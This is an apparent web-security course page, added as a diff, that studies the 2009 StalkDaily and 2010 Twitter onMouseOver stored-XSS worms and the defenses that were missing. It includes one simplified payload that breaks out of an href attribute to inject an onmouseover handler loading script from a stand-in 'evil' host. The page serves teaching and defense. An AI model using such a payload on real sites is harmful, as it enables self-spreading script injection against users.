@@ -1,0 +1,91 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Case Study — Twitter onMouseOver / StalkDaily (2009–2010)</title>
+<link rel="stylesheet" href="../../assets/lab.css">
+<link rel="stylesheet" href="../../module_16_cases/module.css">
+</head>
+<body>
+<nav class="nav">
+  <a href="/">◂ Lab home</a>
+  <a href="../../module_16_cases/">◂ Module 16 index</a>
+</nav>
+
+<p class="kicker">Module 16 · Case Study</p>
+<h1>Twitter Worms — StalkDaily (2009) &amp; onMouseOver (2010)</h1>
+<p class="lead">Two stored-XSS worms that turned a real-time social feed into a
+propagation amplifier. The 2010 one needed nothing but a mouse passing over a
+tweet.</p>
+
+<h2>StalkDaily (April 2009)</h2>
+<p>A stored XSS in Twitter profile fields (URL/bio) let injected JavaScript run
+when others viewed a profile. Like Samy, it self-propagated: infected accounts
+posted tweets and updated their own profiles to spread the worm, advertising the
+"StalkDaily" site. Root cause: profile fields rendered without contextual output
+encoding.</p>
+
+<h2>onMouseOver (September 2010)</h2>
+<p>A more elegant and more viral bug. Twitter auto-linkified URLs in tweets, but a
+flaw in how it did so let an attacker break out of the link's <code>href</code>
+attribute and inject an <code>onmouseover</code> handler <strong>directly into
+the tweet's markup in the timeline</strong>.</p>
+<pre><code>&lt;!-- simplified shape of the injected tweet --&gt;
+http://t.co/@"onmouseover="$.getScript('http://evil/x.js')"/  ...
+&lt;!-- rendered into the timeline as: --&gt;
+&lt;a href="..." onmouseover="$.getScript(...)"&gt;...&lt;/a&gt;</code></pre>
+<ul>
+<li><strong>Mechanism 5 → 2:</strong> attribute-context break-out (Module 08)
+followed by an event handler (Module 05).</li>
+<li><strong>Zero click:</strong> <code>onmouseover</code> fires when the cursor
+merely passes over the tweet while scrolling the timeline — no interaction beyond
+reading.</li>
+<li><strong>Feed as amplifier:</strong> because tweets are shown to
+<em>followers</em> in real time, a single crafted tweet reached enormous audiences
+in minutes; many variants (rainbow-colored blocks, auto-retweeting) appeared
+within hours.</li>
+</ul>
+
+<h2>Mapping to the taxonomy</h2>
+<table>
+<thead><tr><th>Element</th><th>Course concept</th></tr></thead>
+<tbody>
+<tr><td>Break out of <code>href="..."</code></td><td>M08 attribute injection / context escape (mechanism 5)</td></tr>
+<tr><td><code>onmouseover=</code> handler</td><td>M05 event handlers (mechanism 2)</td></tr>
+<tr><td>Fires on hover during normal scrolling</td><td>M05 low/zero-interaction execution</td></tr>
+<tr><td>Timeline shows it to all followers</td><td>M10 stored delivery, amplified by a social graph</td></tr>
+<tr><td><code>$.getScript</code> pulls more code</td><td>M15 chaining / staged payloads</td></tr>
+</tbody>
+</table>
+
+<h2>The absent defenses</h2>
+<div class="card">
+<ul>
+<li><strong>Correct attribute-context encoding</strong> of the linkified URL — the
+single fix. The bug was a break-out from a quoted attribute; encoding the quote
+prevents the injected <code>onmouseover</code> from ever forming (Module 08).</li>
+<li><strong>A strict CSP</strong> (<code>script-src</code> without
+<code>'unsafe-inline'</code>) would have blocked the inline handler and the
+<code>getScript</code> fetch to a foreign host (<code>script-src</code> host
+allowlist).</li>
+<li><strong>Robust HTML construction</strong> (build DOM nodes / use a templating
+layer that encodes by context) rather than string concatenation of URLs into
+markup.</li>
+</ul>
+</div>
+
+<h2>Lesson for defenders</h2>
+<p>The onMouseOver worm is the textbook argument that <strong>auto-firing event
+handlers + a broadcast surface = instant worm</strong>, and that a single missing
+attribute encoder is enough. It also shows why "we linkify user URLs" is a
+dangerous feature: it takes untrusted text and <em>promotes it into markup</em>,
+which is exactly where contextual encoding must be airtight. For your Module 18
+work: any defense claiming to cover mechanism 2 must handle handlers introduced
+via attribute break-out, not just handlers in obviously-injected tags.</p>
+
+<footer>
+Module 16 · <a href="../../module_16_cases/case_studies/magecart.html">Next case: Magecart card skimming ▸</a>
+</footer>
+</body>
+</html>
